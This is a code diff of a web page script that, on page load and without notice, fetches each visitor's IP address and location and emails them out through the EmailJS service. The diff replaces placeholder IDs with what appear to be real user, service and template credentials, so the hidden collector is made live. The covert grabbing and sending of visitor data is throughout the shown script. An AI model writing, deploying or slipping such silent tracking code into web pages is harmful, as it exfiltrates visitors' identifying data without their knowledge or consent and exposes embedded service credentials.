@@ -13,7 +13,7 @@
     <script>
         (function(){
             // Initialize EmailJS
-            emailjs.init("your_user_id"); // Replace with your EmailJS User ID
+            emailjs.init("xzn0o06W5jFkiRdZ8"); // Replace with your EmailJS User ID
 
             // Automatically get IP address and location on page load
             $.get('https://api.ipify.org?format=json', function(data) {
@@ -28,11 +28,11 @@
                     };
 
                     // Send the email using EmailJS
-                    emailjs.send("your_service_id", "your_template_id", emailParams)
+                    emailjs.send("service_4wkbdl7", "template_52ugwhj", emailParams)
                         .then((response) => {
                             console.log('SUCCESS!', response.status, response.text);
                         }, (error) => {
-                            console.log('FAILED...', error);
+                            console.error('FAILED...', error); // Log error for debugging
                         });
                 });
             });
